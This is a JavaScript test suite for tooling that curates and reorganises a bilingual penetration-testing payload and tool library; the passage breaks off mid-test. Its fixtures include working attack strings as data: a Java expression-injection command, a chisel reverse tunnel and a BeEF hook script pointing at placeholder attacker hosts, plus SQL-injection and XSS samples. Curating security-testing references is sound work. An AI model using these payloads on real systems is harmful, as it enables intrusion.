import assert from 'node:assert/strict';
import { test } from 'node:test';

import {
  applyPayloadCommandOverrides,
  applyPayloadOverrides,
  curatePayloadContent,
  curatePayloadLibrary,
  normalizeReferenceUrls,
  validatePayloadCommandOverrideDocument,
  validatePayloadOverrideDocument,
} from '../scripts/curate-payload-library.mjs';
import { payloadContentHash } from '../scripts/payload-editorial-review.mjs';
import { auditCurationCoverage } from '../scripts/apply-payload-curation.mjs';

const i18n = (zh, en = '') => ({ zh, en });
const text = value => typeof value === 'string' ? value : String(value?.zh || value?.en || '');
const countToolReferences = (nodes, toolId) => (nodes || []).reduce((count, node) => (
  count + (node.toolId === toolId ? 1 : 0) + countToolReferences(node.children, toolId)
), 0);

const execution = (title, command) => ({
  title: i18n(title, title),
  command,
  description: i18n(`${title}说明`, `${title} description`),
  platform: 'all',
});

const payload = (id, overrides = {}) => ({
  id,
  name: i18n('Expression Language Injection (243 lines)', 'Expression Language Injection (243 lines)'),
  description: i18n('Expression Language Injection (243 lines)的Payload集合', 'Expression Language Injection payload collection'),
  category: i18n('RCE远程代码执行', 'Remote Code Execution'),
  subCategory: i18n('Expression Language Injection (243 lines)', 'Expression Language Injection (243 lines)'),
  tags: ['expression', 'injection'],
  prerequisites: [i18n('目标存在对应注入点', '目标存在对应注入点')],
  execution: [execution('表达式验证', "T(java.lang.Runtime).getRuntime().exec('id')")],
  wafBypass: [],
  attackChain: [{ title: i18n('利用步骤', '利用步骤'), description: i18n('选择对应payload测试', '选择对应payload测试') }],
  opsecTips: [],
  references: [],
  ...overrides,
});

const tool = (id, commands = []) => ({
  id,
  name: i18n(id, id),
  description: i18n(`${id}工具命令`, `${id} commands`),
  category: i18n('隧道代理', 'Tunneling and Proxy'),
  commands,
  references: [],
});

const toolCommand = (name, command) => ({
  name: i18n(name, name),
  command,
  description: i18n(`${name}说明`, `${name} description`),
  platform: 'all',
});

const hasHanInEnglish = value => {
  if (Array.isArray(value)) return value.some(hasHanInEnglish);
  if (!value || typeof value !== 'object') return false;
  if (typeof value.en === 'string' && /\p{Script=Han}/u.test(value.en)) return true;
  return Object.entries(value).some(([key, item]) => key !== 'en' && hasHanInEnglish(item));
};

test('content curation preserves commands while replacing collection residue and generic teaching content', () => {
  const source = payload('expression-language');
  const curated = curatePayloadContent(source);

  assert.equal(curated.execution[0].command, source.execution[0].command);
  assert.doesNotMatch(text(curated.name), /\d+\s*lines/i);
  assert.doesNotMatch(text(curated.description), /Payload集合|\d+\s*lines/i);
  assert.doesNotMatch(text(curated.subCategory), /\d+\s*lines/i);
  assert.equal(curated.attackChain.length >= 4, true);
  assert.equal(curated.attackChain.every(step => text(step.title) !== text(step.description)), true);
  assert.equal(curated.attackChain.some(step => step.payload === source.execution[0].command), true);
  assert.equal(curated.tutorial && ['overview', 'vulnerability', 'exploitation', 'mitigation'].every(field => text(curated.tutorial[field]).length >= 20), true);
  assert.equal(curated.references.length >= 1, true);
  assert.equal(hasHanInEnglish(curated), false);
});

test('library curation migrates tool manuals, deduplicates commands, and moves navigation ownership', () => {
  const duplicate = './chisel server -p 8000 --reverse';
  const sourceChisel = payload('tunnel-chisel', {
    name: i18n('Chisel内网穿透', 'Chisel Tunneling'),
    category: i18n('隧道代理', 'Tunneling and Proxy'),
    execution: [execution('服务端', duplicate), execution('反向SOCKS', 'chisel.exe client {ATTACKER_IP}:8000 R:socks')],
  });
  const sourceNgrok = payload('tunnel-ngrok', {
    name: i18n('Ngrok内网穿透', 'Ngrok Tunneling'),
    category: i18n('隧道代理', 'Tunneling and Proxy'),
    execution: [execution('HTTP隧道', 'ngrok http 8080')],
  });
  const snapshot = {
    payloads: [sourceChisel, sourceNgrok, payload('kept-payload')],
    tools: [{
      ...tool('chisel-tool', [toolCommand('过时命令', 'chisel-old')]),
      references: ['https://example.test/existing-tool-reference'],
    }],
    navigation: [{
      id: 'intranet',
      name: i18n('内网'),
      children: [
        { id: 'chisel-nav', name: i18n('Chisel'), payloadId: 'tunnel-chisel' },
        { id: 'ngrok-nav', name: i18n('Ngrok'), payloadId: 'tunnel-ngrok' },
        { id: 'keep-nav', name: i18n('保留'), payloadId: 'kept-payload' },
      ],
    }],
    toolNavigation: [{
      id: 'tunneling-tools',
      name: i18n('隧道代理工具'),
      children: [{ id: 'chisel-tool-nav', name: i18n('Chisel'), toolId: 'chisel-tool' }],
    }],
  };
  const migrations = [
    {
      sourceId: 'tunnel-chisel',
      targets: [{
        targetToolId: 'chisel-tool',
        navRootId: 'tunneling-tools',
        replaceCommands: true,
        targetReferences: ['https://example.test/migration-reference'],
        commands: [toolCommand('服务端', duplicate), toolCommand('反向 SOCKS', 'chisel.exe client {ATTACKER_IP}:8000 R:socks')],
      }],
    },
    {
      sourceId: 'tunnel-ngrok',
      targets: [{
        targetToolId: 'ngrok-tunnel',
        targetName: i18n('Ngrok', 'Ngrok'),
        targetDescription: i18n('Ngrok 隧道命令参考。', 'Ngrok tunneling command reference.'),
        targetCategory: i18n('隧道代理', 'Tunneling and Proxy'),
        navRootId: 'tunneling-tools',
        commands: [execution('HTTP 隧道', 'ngrok http 80')],
      }],
    },
  ];

  const result = curatePayloadLibrary(snapshot, { toolMigrations: migrations });
  const chisel = result.snapshot.tools.find(item => item.id === 'chisel-tool');
  const ngrok = result.snapshot.tools.find(item => item.id === 'ngrok-tunnel');
  const serializedPayloadNav = JSON.stringify(result.snapshot.navigation);

  assert.deepEqual(result.snapshot.payloads.map(item => item.id), ['kept-payload']);
  assert.equal(chisel.commands.filter(item => item.command === duplicate).length, 1);
  assert.equal(chisel.commands.some(item => item.command.includes('R:socks')), true);
  assert.equal(chisel.commands.some(item => item.command === 'chisel-old'), false);
  assert.deepEqual(chisel.references, [
    'https://example.test/existing-tool-reference',
    'https://example.test/migration-reference',
  ]);
  assert.deepEqual(ngrok.commands.map(item => item.command), ['ngrok http 80']);
  assert.doesNotMatch(serializedPayloadNav, /tunnel-chisel|tunnel-ngrok/);
  assert.match(serializedPayloadNav, /kept-payload/);
  assert.equal(countToolReferences(result.snapshot.toolNavigation, 'chisel-tool'), 1);
  assert.equal(countToolReferences(result.snapshot.toolNavigation, 'ngrok-tunnel'), 1);
  assert.deepEqual(result.ledger.map(item => ({ id: item.id, decision: item.decision, targetToolId: item.targetToolId })), [
    { id: 'tunnel-chisel', decision: 'tool', targetToolId: 'chisel-tool' },
    { id: 'tunnel-ngrok', decision: 'tool', targetToolId: 'ngrok-tunnel' },
    { id: 'kept-payload', decision: 'payload', targetToolId: undefined },
  ]);
  const keptLedger = result.ledger.find(item => item.id === 'kept-payload');
  const keptResult = result.snapshot.payloads.find(item => item.id === 'kept-payload');
  assert.equal(keptLedger.contentHash, payloadContentHash(snapshot.payloads[2]));
  assert.equal(keptLedger.resultContentHash, payloadContentHash(keptResult));
});

test('manual override documents cover their prefix, preserve commands, and reject weak or dangling content', () => {
  const source = payload('ssti2-expression');
  const replacementCommand = source.execution[0].command;
  const entry = {
    id: source.id,
    name: i18n('表达式语言注入', 'Expression Language Injection'),
    description: i18n('表达式语言注入发生在应用把不可信输入交给服务端表达式求值器时，可导致对象访问、方法调用或执行边界被突破。', 'Expression language injection occurs when an application passes untrusted input to a server-side expression evaluator, enabling unintended object access or method invocation.'),
    category: i18n('RCE远程代码执行', 'Remote Code Execution'),
    subCategory: i18n('表达式语言注入', 'Expression Language Injection'),
    prerequisites: [
      i18n('已定位服务端表达式求值入口并准备无副作用测试数据。', 'A server-side expression entry point and side-effect-free test data are available.'),
      i18n('可以查看对应请求的服务端解析与求值日志。', 'Server-side parsing and evaluation logs for the request are observable.'),
    ],
    tutorial: {
      overview: i18n('该条目用于验证表达式输入是否在服务端被求值。审校时需要区分字符串回显、模板插值与真正的方法调用，并结合响应和服务端日志判断结果。', 'This entry validates whether expression input is evaluated on the server. Distinguish reflection and interpolation from method invocation by comparing responses and server logs.'),
      vulnerability: i18n('根因是应用把用户输入拼入表达式上下文，同时向求值器暴露了超出业务需要的对象、类型或方法。若缺少允许列表与隔离，输入就可能跨越数据和代码边界。', 'The root cause is user input entering an expression context that exposes objects, types, or methods beyond business needs. Without allowlists and isolation, data can cross into code behavior.'),
      exploitation: i18n('步骤一记录普通字符串输入的响应；步骤二提交只执行无副作用计算的表达式并比较结果；步骤三使用受控方法调用验证边界，同时核对日志并排除缓存或模板预渲染造成的假阳性。', 'First record a plain-string response. Then submit a side-effect-free expression and compare results. Finally validate the method boundary with a controlled call, correlate logs, and exclude caching or pre-rendering false positives.'),
      mitigation: i18n('不要动态求值用户输入；必须使用表达式时只暴露允许的变量和函数，关闭类型与反射访问，并在低权限隔离进程中运行；同时记录表达式解析错误和异常方法调用。', 'Do not evaluate user input dynamically. If expressions are required, expose only allowed variables and functions, disable type and reflection access, run in a low-privilege sandbox, and audit parser errors and abnormal calls.'),
      difficulty: 'advanced',
    },
    attackChain: [
      { title: i18n('确认表达式入口', 'Confirm the expression entry'), description: i18n('定位参数进入表达式求值器的位置，并记录普通字符串输入的正常响应和服务端组件。', 'Locate where the parameter reaches the expression evaluator and record the normal response and server component.') },
      { title: i18n('验证无副作用求值', 'Validate side-effect-free evaluation'), description: i18n('使用常量运算建立可重复证据，确认结果来自服务端求值而不是简单回显或客户端渲染。', 'Use a constant expression to prove server-side evaluation rather than reflection or client rendering.') },
      { title: i18n('核对方法调用边界', 'Check the method-call boundary'), description: i18n('提交受控方法调用并关联应用日志，确认允许对象和方法是否超出业务需求。', 'Submit a controlled method call and correlate application logs to determine whether exposed objects and methods exceed business needs.'), payload: replacementCommand },
      { title: i18n('修复并重放基线', 'Remediate and replay the baseline'), description: i18n('关闭动态求值或应用允许列表后，重放普通输入和表达式输入，确认业务功能保留且求值证据消失。', 'Disable dynamic evaluation or apply an allowlist, then replay normal and expression input to confirm business behavior remains while evaluation evidence disappears.') },
    ],
    references: ['https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection'],
    analysis: i18n('常量表达式结果、服务端求值日志和普通字符串对照必须相互一致，单纯回显输入不能确认表达式注入。', 'A constant-expression result, server-side evaluation logs, and the plain-string control must agree; reflection alone does not confirm expression injection.'),
    opsecTips: [
      i18n('只使用无副作用常量表达式，并限制请求频率。', 'Use side-effect-free constant expressions only and limit request frequency.'),
      i18n('出现意外方法调用或资源增长时立即停止并保存日志。', 'Stop immediately and preserve logs on unexpected method calls or resource growth.'),
    ],
    review: { decision: 'payload', rationale: '服务端表达式注入属于漏洞验证卡，不是工具手册。', issuesResolved: ['category', 'tutorial', 'attack-chain'] },
  };
  const document = { schemaVersion: 1, contentStandard: 2, sourcePrefix: 'ssti2', entries: [entry] };

  assert.deepEqual(validatePayloadOverrideDocument(document, [source]), []);
  const explicitDocument = { ...document, sourcePrefix: undefined, sourceIds: [source.id] };
  assert.deepEqual(validatePayloadOverrideDocument(explicitDocument, [source]), []);
  const referencedDocument = structuredClone(document);
  delete referencedDocument.entries[0].attackChain[2].payload;
  referencedDocument.entries[0].attackChain[2].payloadRef = { area: 'execution', index: 0 };
  assert.deepEqual(validatePayloadOverrideDocument(referencedDocument, [source]), []);
  const [referenced] = applyPayloadOverrides([source], [referencedDocument]);
  assert.equal(referenced.attackChain[2].payload, source.execution[0].command);
  assert.equal('payloadRef' in referenced.attackChain[2], false);
  const [curated] = applyPayloadOverrides([source], [document]);
  assert.equal(text(curated.name), '表达式语言注入');
  assert.equal(curated.execution[0].command, source.execution[0].command);
  assert.deepEqual(curated.tutorial, entry.tutorial);
  assert.deepEqual(curated.analysis, entry.analysis);
  assert.deepEqual(curated.opsecTips, entry.opsecTips);

  const invalid = structuredClone(document);
  invalid.entries.push({ ...entry, id: 'ssti2-ghost' });
  invalid.entries[0].tutorial.overview = i18n('太短', '太短');
  invalid.entries[0].category.zh = 'RCE????';
  delete invalid.entries[0].analysis;
  invalid.entries[0].attackChain[2].payload = 'not present';
  const errorCodes = validatePayloadOverrideDocument(invalid, [source]).map(error => error.code);
  assert.equal(errorCodes.includes('UNKNOWN_ID'), true);
  assert.equal(errorCodes.includes('INVALID_TUTORIAL'), true);
  assert.equal(errorCodes.includes('LOCALIZED_ENGLISH'), true);
  assert.equal(errorCodes.includes('CORRUPT_TEXT'), true);
  assert.equal(errorCodes.includes('INCOMPLETE_OPERATIONAL_CONTENT'), true);
  assert.equal(errorCodes.includes('DANGLING_CHAIN_PAYLOAD'), true);
});

test('payload command overrides are stale-safe and keep attack-chain references synchronized', () => {
  const source = payload('command-cleanup', {
    execution: [execution('验证请求', 'curl https://target.test\n在测试环境执行上述请求')],
  });
  source.attackChain[0].payload = source.execution[0].command;
  const document = {
    schemaVersion: 1,
    entries: [
      {
        id: source.id,
        patches: [
          {
            area: 'execution',
            index: 0,
            expectedCommand: source.execution[0].command,
            command: 'curl https://target.test',
            title: i18n('本地验证请求', 'Local Validation Request'),
            description: i18n(
              '向登记的测试端点发送单次请求并保存状态码与响应摘要。',
              'Send one request to the registered test endpoint and preserve status plus a response summary.',
            ),
            syntaxBreakdown: [],
            platform: 'linux',
            requiresAdmin: false,
          },
        ],
      },
    ],
  };

  assert.deepEqual(validatePayloadCommandOverrideDocument(document, [source]), []);
  const [curated] = applyPayloadCommandOverrides([source], document);
  assert.equal(curated.execution[0].command, 'curl https://target.test');
  assert.deepEqual(curated.execution[0].title, i18n('本地验证请求', 'Local Validation Request'));
  assert.deepEqual(curated.execution[0].description, i18n(
    '向登记的测试端点发送单次请求并保存状态码与响应摘要。',
    'Send one request to the registered test endpoint and preserve status plus a response summary.',
  ));
  assert.deepEqual(curated.execution[0].syntaxBreakdown, []);
  assert.equal(curated.execution[0].platform, 'linux');
  assert.equal(curated.execution[0].requiresAdmin, false);
  assert.equal(curated.attackChain[0].payload, 'curl https://target.test');

  const stale = structuredClone(document);
  stale.entries[0].patches[0].expectedCommand = 'stale source command';
  assert.equal(
    validatePayloadCommandOverrideDocument(stale, [source]).some(error => error.code === 'STALE_COMMAND'),
    true,
  );
});

test('multi-target migration and split decisions route only the reviewed command indexes', () => {
  const bloodhound = payload('bloodhound-enumeration', {
    name: i18n('BloodHound域分析', 'BloodHound Domain Analysis'),
    description: i18n('在授权域环境中分别使用采集器生成图数据，并将结果导入分析工具定位可验证的权限路径。', 'Use each collector in an authorized domain to generate graph data, then import the results into the analysis tool to identify verifiable privilege paths.'),
    execution: [
      execution('SharpHound采集', 'SharpHound.exe -c All'),
      execution('Python采集', 'bloodhound-python -u user -p pass -d domain.local -c All'),
      execution('旧控制台流程', 'sudo neo4j console'),
    ],
  });
  const beef = payload('xss-beef', {
    name: i18n('BeEF框架利用', 'BeEF Framework Use'),
    category: i18n('XSS跨站脚本', 'Cross-Site Scripting'),
    execution: [
      execution('安装框架', './install'),
      execution('Hook注入', '<script src="https://{ATTACKER_HOST}/hook.js"></script>'),
      execution('启动控制台', './beef'),
      execution('模块目录', 'ls modules/'),
    ],
  });
  const snapshot = {
    payloads: [bloodhound, beef],
    tools: [tool('sharphound'), tool('bloodhound-python')],
    navigation: [{
      id: 'root',
      name: i18n('Payload'),
      children: [
        { id: 'bloodhound-nav', name: bloodhound.name, payloadId: bloodhound.id },
        { id: 'beef-nav', name: beef.name, payloadId: beef.id },
      ],
    }],
    toolNavigation: [
      { id: 'intranet-tools', name: i18n('内网工具'), children: [] },
      { id: 'exploit-tools', name: i18n('利用工具'), children: [] },
    ],
  };

  const result = curatePayloadLibrary(snapshot, {
    toolMigrations: [{
      sourceId: bloodhound.id,
      targets: [
        { targetToolId: 'sharphound', commandIndexes: [0], navRootId: 'intranet-tools' },
        { targetToolId: 'bloodhound-python', commandIndexes: [1], navRootId: 'intranet-tools' },
      ],
    }],
    payloadSplits: [{
      sourceId: beef.id,
      retainExecutionIndexes: [],
      retainCommands: [execution('Hook注入', '<script src="https://{ATTACKER_HOST}/hook.js"></script>')],
      payloadOverrides: {
        name: i18n('BeEF Hook 注入', 'BeEF Hook Injection'),
        attackChain: [
          { title: i18n('确认输出点'), description: i18n('确认测试输入进入可执行 HTML 上下文并记录正常输出基线。') },
          { title: i18n('加载 Hook'), description: i18n('在隔离页面加载授权 BeEF 实例的 Hook 并记录网络请求。'), payload: '<script src="https://{ATTACKER_HOST}/hook.js"></script>' },
          { title: i18n('清理并复测'), description: i18n('完成上下文编码修复后清理会话，并重放相同输入确认按文本显示。') },
        ],
      },
      targets: [{
        targetToolId: 'beef-framework',
        commandIndexes: [0, 2, 3],
        targetName: i18n('BeEF Framework', 'BeEF Framework'),
        targetDescription: i18n('BeEF 框架部署与控制台命令。', 'BeEF framework deployment and console commands.'),
        targetCategory: i18n('Web渗透', 'Web Pentest'),
        navRootId: 'exploit-tools',
      }],
    }],
  });
  const keptBeef = result.snapshot.payloads.find(item => item.id === beef.id);
  const sharphound = result.snapshot.tools.find(item => item.id === 'sharphound');
  const bloodhoundPython = result.snapshot.tools.find(item => item.id === 'bloodhound-python');
  const beefTool = result.snapshot.tools.find(item => item.id === 'beef-framework');
  const bloodhoundLedger = result.ledger.find(item => item.id === bloodhound.id);
  const beefLedger = result.ledger.find(item => item.id === beef.id);

  assert.deepEqual(result.snapshot.payloads.map(item => item.id), [beef.id]);
  assert.deepEqual(keptBeef.execution.map(item => item.command), ['<script src="https://{ATTACKER_HOST}/hook.js"></script>']);
  assert.equal(text(keptBeef.name), 'BeEF Hook 注入');
  assert.equal(sharphound.commands.some(item => item.command.startsWith('SharpHound')), true);
  assert.match(sharphound.commands.find(item => item.command.startsWith('SharpHound')).description.en, /authorized domain/);
  assert.equal(bloodhoundPython.commands.some(item => item.command.startsWith('bloodhound-python')), true);
  assert.equal(result.snapshot.tools.some(item => item.commands.some(commandItem => commandItem.command === 'sudo neo4j console')), false);
  assert.deepEqual(beefTool.commands.map(item => item.command), ['./install', './beef', 'ls modules/']);
  assert.deepEqual(bloodhoundLedger.targetToolIds, ['sharphound', 'bloodhound-python']);
  assert.equal(beefLedger.decision, 'split');
  assert.deepEqual(beefLedger.targetToolIds, ['beef-framework']);
  assert.match(JSON.stringify(result.snapshot.navigation), /xss-beef/);
  assert.doesNotMatch(JSON.stringify(result.snapshot.navigation), /bloodhound-enumeration/);
});

test('curation moves a payload leaf to the branch that matches its reviewed category', () => {
  const misplaced = payload('rce-misplaced', {
    name: i18n('服务端表达式执行', 'Server-Side Expression Execution'),
    category: i18n('RCE 远程代码执行', 'RCE'),
  });
  const result = curatePayloadLibrary({
    payloads: [misplaced],
    tools: [],
    navigation: [{
      id: 'web',
      name: i18n('Web'),
      children: [
        {
          id: 'sqli',
          name: i18n('SQL/NoSQL注入', 'SQL/NoSQL Injection'),
          children: [{ id: 'misplaced-nav', name: i18n('旧名称', 'Old name'), payloadId: misplaced.id }],
        },
      ],
    }],
    toolNavigation: [],
  }, {
    payloadBranches: [
      {
        rootId: 'web',
        id: 'sqli',
        name: i18n('SQL/NoSQL 注入', 'SQL and NoSQL Injection'),
      },
      {
        rootId: 'web',
        id: 'rce',
        name: i18n('RCE远程代码执行', 'Remote Code Execution'),
      },
    ],
  });
  const [web] = result.snapshot.navigation;
  const sqli = web.children.find(item => item.id === 'sqli');
  const rce = web.children.find(item => item.id === 'rce');

  assert.equal(sqli.children.length, 0);
  assert.equal(sqli.name.en, 'SQL and NoSQL Injection');
  assert.deepEqual(rce.children.map(item => item.payloadId), [misplaced.id]);
  assert.equal(text(rce.children[0].name), '服务端表达式执行');
  assert.equal(text(result.snapshot.payloads[0].category), 'RCE远程代码执行');
});

test('collection split replaces one mixed card with independently categorized payload cards', () => {
  const mixed = payload('mixed-collection', {
    name: i18n('混合集', 'Mixed Collection'),
    category: i18n('SQL/NoSQL注入', 'SQL/NoSQL Injection'),
    execution: [execution('混合命令', "' OR 1=1--\n<script>alert(1)</script>\ndns-server --config rebinding.toml")],
  });
  const makeReplacement = (id, name, category, command) => ({
    id,
    name: i18n(name, name),
    description: i18n(`${name}的独立验证卡。`, `Independent validation card for ${name}.`),
    category,
    subCategory: i18n(name, name),
    execution: [execution(name, command)],
  });
  const result = curatePayloadLibrary({
    payloads: [mixed],
    tools: [tool('dns-attacks')],
    navigation: [{
      id: 'web',
      name: i18n('Web'),
      children: [
        {
          id: 'sqli',
          name: i18n('SQL/NoSQL注入', 'SQL/NoSQL Injection'),
          children: [{ id: 'mixed-nav', name: mixed.name, payloadId: mixed.id }],
        },
        { id: 'xss', name: i18n('XSS跨站脚本', 'XSS Cross-Site Scripting'), children: [] },
      ],
    }],
    toolNavigation: [{ id: 'network-tools', name: i18n('网络工具', 'Network Tools'), children: [] }],
  }, {
    collectionSplits: [{
      sourceId: mixed.id,
      replacements: [
        makeReplacement('mixed-sqli', '认证 SQL 注入', i18n('SQL/NoSQL注入', 'SQL/NoSQL Injection'), "' OR 1=1--"),
        makeReplacement('mixed-xss', '存储型 XSS', i18n('XSS跨站脚本', 'XSS Cross-Site Scripting'), '<script>alert(1)</script>'),
      ],
      toolTargets: [{
        targetToolId: 'dns-attacks',
        navRootId: 'network-tools',
        commands: [toolCommand('DNS 测试服务配置', 'dns-server --config rebinding.toml')],
      }],
    }],
  });
  const [web] = result.snapshot.navigation;
  const sqli = web.children.find(item => item.id === 'sqli');
  const xss = web.children.find(item => item.id === 'xss');

  assert.deepEqual(result.snapshot.payloads.map(item => item.id), ['mixed-sqli', 'mixed-xss']);
  assert.deepEqual(result.snapshot.payloads.map(item => item.execution[0].command), ["' OR 1=1--", '<script>alert(1)</script>']);
  assert.deepEqual(sqli.children.map(item => item.payloadId), ['mixed-sqli']);
  assert.deepEqual(xss.children.map(item => item.payloadId), ['mixed-xss']);
  assert.equal(
    result.snapshot.tools.find(item => item.id === 'dns-attacks').commands.some(item => item.command === 'dns-server --config rebinding.toml'),
    true,
  );
  assert.deepEqual(result.ledger, [{
    id: mixed.id,
    decision: 'split',
    targetPayloadIds: ['mixed-sqli', 'mixed-xss'],
    targetToolIds: ['dns-attacks'],
    contentHash: payloadContentHash(mixed),
    resultContentHashes: Object.fromEntries(result.snapshot.payloads.map(item => [item.id, payloadContentHash(item)])),
  }]);

  const repeated = curatePayloadLibrary(result.snapshot, {
    collectionSplits: [{
      sourceId: mixed.id,
      replacements: [
        makeReplacement('mixed-sqli', '认证 SQL 注入', i18n('SQL/NoSQL注入', 'SQL/NoSQL Injection'), "' OR 1=1--"),
        makeReplacement('mixed-xss', '存储型 XSS', i18n('XSS跨站脚本', 'XSS Cross-Site Scripting'), '<script>alert(1)</script>'),
      ],
    }],
  });
  assert.deepEqual(repeated.snapshot.navigation, result.snapshot.navigation);
});

test('collection split conserves every source line and records reviewed retirements', () => {
  const mixed = payload('retired-collection', {
    execution: [execution('混合命令', 'valid://one\ninvalid://legacy\nvalid://two')],
  });
  const makeReplacement = (id, command) => ({
    id,
    name: i18n(id, id),
    description: i18n(`${id} 独立验证卡内容。`, `Independent validation content for ${id}.`),
    category: i18n('文件漏洞', 'File Vulnerabilities'),
    subCategory: i18n('协议验证', 'Protocol Validation'),
    execution: [execution(id, command)],
    wafBypass: [],
    attackChain: [
      { title: i18n('确认入口', 'Confirm entry'), description: i18n('确认测试入口与解析器边界。', 'Confirm the test entry and parser boundary.') },
      { title: i18n('提交样例', 'Submit sample'), description: i18n('提交该独立命令并记录处理证据。', 'Submit the independent command and record processing evidence.'), payloadRef: { area: 'execution', index: 0 } },
      { title: i18n('验证修复', 'Verify remediation'), description: i18n('修复后重放相同样例并比较结果。', 'Replay the same sample after remediation and compare results.') },
    ],
  });
  const split = {
    sourceId: mixed.id,
    replacements: [
      makeReplacement('retired-one', 'valid://one'),
      makeReplacement('retired-two', 'valid://two'),
    ],
    retiredCommands: [{
      command: 'invalid://legacy',
      reason: i18n('该旧协议名不是已注册处理器，无法形成可执行验证。', 'The legacy scheme is not a registered handler and cannot form an executable validation.'),
    }],
  };
  const input = {
    payloads: [mixed],
    tools: [],
    navigation: [],
    toolNavigation: [],
  };

  const result = curatePayloadLibrary(input, { collectionSplits: [split] });
  assert.deepEqual(result.ledger[0].retiredCommands, split.retiredCommands);
  assert.equal(result.snapshot.payloads[0].attackChain[1].payload, 'valid://one');
  assert.equal('payloadRef' in result.snapshot.payloads[0].attackChain[1], false);
  assert.throws(
    () => curatePayloadLibrary(input, {
      collectionSplits: [{ ...split, retiredCommands: [] }],
    }),
    /does not conserve source command lines/,
  );
  assert.throws(
    () => curatePayloadLibrary(input, {
      collectionSplits: [{
        ...split,
        replacements: [
          makeReplacement('retired-one', 'valid://one\ninvalid://legacy'),
          makeReplacement('retired-two', 'valid://two'),
        ],
      }],
    }),
    /routed more than once/,
  );
  assert.throws(
    () => curatePayloadLibrary(input, {
      collectionSplits: [{
        ...split,
        retiredCommands: [{ command: 'invalid://legacy', reason: i18n('', '') }],
      }],
    }),
    /requires a bilingual reason/,
  );
});

test('collection split may route entirely to tools while retiring invalid source lines', () => {
  const source = payload('tool-only-collection', {
    execution: [execution('混合参考', '/usr/lib/libc.so\ninvalid://legacy')],
  });
  const result = curatePayloadLibrary({
    payloads: [source],
    tools: [tool('php-attacks')],
    navigation: [{ id: 'web', name: i18n('Web'), children: [{ id: 'source-nav', name: source.name, payloadId: source.id }] }],
    toolNavigation: [{ id: 'web-tools', name: i18n('Web 工具', 'Web Tools'), children: [] }],
  }, {
    collectionSplits: [{
      sourceId: source.id,
      replacements: [],
      toolTargets: [{
        targetToolId: 'php-attacks',
        navRootId: 'web-tools',
        commands: [toolCommand('libc 路径', '/usr/lib/libc.so')],
      }],
      retiredCommands: [{
        command: 'invalid://legacy',
        reason: i18n('该协议名没有注册处理器，不能形成有效验证输入。', 'The scheme has no registered handler and cannot form a valid validation input.'),
      }],
    }],
  });

  assert.deepEqual(result.snapshot.payloads, []);
  assert.equal(result.snapshot.tools[0].commands.some(item => item.command === '/usr/lib/libc.so'), true);
  assert.doesNotMatch(JSON.stringify(result.snapshot.navigation), /tool-only-collection/);
  assert.deepEqual(result.ledger[0].targetPayloadIds, []);
  assert.deepEqual(result.ledger[0].targetToolIds, ['php-attacks']);
});

test('coverage audit blocks unreviewed records and review decisions without executable routing', () => {
  const source = [payload('reviewed'), payload('unmatched-split'), payload('migrated'), payload('missing')];
  const report = auditCurationCoverage(source, {
    overrideDocuments: [{
      entries: [
        { id: 'reviewed', review: { decision: 'payload' } },
        { id: 'unmatched-split', review: { decision: 'split' } },
        { id: 'migrated', review: { decision: 'tool', targetToolIds: ['expected-tool'] } },
        { id: 'ghost', review: { decision: 'payload' } },
      ],
    }],
    toolMigrations: [{ sourceId: 'migrated', targetToolId: 'tool' }],
  });

  assert.deepEqual(report.missingReviewIds, ['missing']);
  assert.deepEqual(report.unknownReviewedIds, ['ghost']);
  assert.deepEqual(report.duplicateReviewIds, []);
  assert.deepEqual(report.duplicateDecisionIds, []);
  assert.deepEqual(report.unmatchedReviewDecisions, [{ id: 'unmatched-split', decision: 'split' }]);
  assert.deepEqual(report.routeMismatches, [{
    id: 'migrated',
    decision: 'tool',
    declaredPayloadIds: [],
    actualPayloadIds: [],
    declaredToolIds: ['expected-tool'],
    actualToolIds: ['tool'],
  }]);
  assert.equal(report.complete, false);
});

test('tool overrides apply reviewed translations through explicit existing paths', () => {
  const sourceTool = tool('translated-tool', [toolCommand('命令', 'tool --help')]);
  sourceTool.commands[0].name.en = '命令';
  const snapshot = {
    payloads: [],
    tools: [sourceTool],
    navigation: [],
    toolNavigation: [],
  };
  const result = curatePayloadLibrary(snapshot, {
    toolOverrides: [{
      id: sourceTool.id,
      patches: [
        { path: 'commands.0.name.en', value: 'Command' },
        { op: 'add', path: 'installation', value: i18n('安装说明', 'Installation notes') },
      ],
    }],
  });

  assert.equal(result.snapshot.tools[0].commands[0].name.en, 'Command');
  assert.equal(result.snapshot.tools[0].installation.en, 'Installation notes');
  assert.throws(() => curatePayloadLibrary(snapshot, {
    toolOverrides: [{ id: sourceTool.id, patches: [{ path: 'commands.9.name.en', value: 'Missing' }] }],
  }), /override path/i);
});

test('tool overrides compose disjoint review layers and reject duplicate paths', () => {
  const sourceTool = tool('layered-tool', [toolCommand('检查', 'tool --check')]);
  const snapshot = {
    payloads: [],
    tools: [sourceTool],
    navigation: [],
    toolNavigation: [],
  };
  const result = curatePayloadLibrary(snapshot, {
    toolOverrides: [
      {
        id: sourceTool.id,
        patches: [{ path: 'description.zh', value: '第一轮工具说明补充了适用范围和使用边界。' }],
      },
      {
        id: sourceTool.id,
        patches: [{ path: 'commands.0.description.zh', value: '第二轮命令说明补充了预期输出和核对方式。' }],
      },
    ],
  });

  assert.equal(result.snapshot.tools[0].description.zh, '第一轮工具说明补充了适用范围和使用边界。');
  assert.equal(result.snapshot.tools[0].commands[0].description.zh, '第二轮命令说明补充了预期输出和核对方式。');
  assert.throws(() => curatePayloadLibrary(snapshot, {
    toolOverrides: [
      { id: sourceTool.id, patches: [{ path: 'description.zh', value: '第一层' }] },
      { id: sourceTool.id, patches: [{ path: 'description.zh', value: '第二层' }] },
    ],
  }), /duplicate tool override path/i);
});

test('tool merges consolidate duplicate command cards and remove duplicate navigation leaves', () => {
  const primary = tool('wfuzz', [toolCommand('目录', 'wfuzz -w dirs.txt https://target/FUZZ')]);
  const duplicate = tool('wfuzz-tool', [
    toolCommand('目录重复', 'wfuzz -w dirs.txt https://target/FUZZ'),
    toolCommand('参数', 'wfuzz -w params.txt https://target/?FUZZ=value'),
  ]);
  const result = curatePayloadLibrary({
    payloads: [],
    tools: [primary, duplicate],
    navigation: [],
    toolNavigation: [{
      id: 'web-tools',
      name: i18n('Web 工具', 'Web Tools'),
      children: [
        { id: 'wfuzz-nav', name: primary.name, toolId: primary.id },
        { id: 'wfuzz-tool-nav', name: duplicate.name, toolId: duplicate.id },
      ],
    }],
  }, {
    toolMerges: [{ sourceToolId: duplicate.id, targetToolId: primary.id }],
  });

